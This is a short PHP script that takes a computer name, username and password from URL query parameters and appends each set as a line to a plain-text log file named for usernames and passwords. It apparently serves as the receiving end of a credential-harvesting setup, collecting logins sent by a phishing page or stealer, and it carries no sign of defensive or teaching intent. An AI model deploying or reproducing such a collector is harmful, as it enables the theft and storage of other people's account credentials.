<?php 
// error_reporting(0);
$comp =  $_GET["comp"];
$user =  $_GET["user"];
$pass =  $_GET["pass"];
// var_dump($_GET);

$fp = fopen('log/Usernames_and_pass.txt', 'a');//opens file in append mode
$STRING = $comp.':'.$user.':'.$pass; 
$lines = file('log/Usernames_and_pass.txt', FILE_IGNORE_NEW_LINES);
write_to_file($STRING);


function write_to_file($STRING)  {
$fp = fopen('log/Usernames_and_pass.txt', 'a');//opens file in append mode  
fwrite($fp, "\n".$STRING);  

fclose($fp);  
}   
?>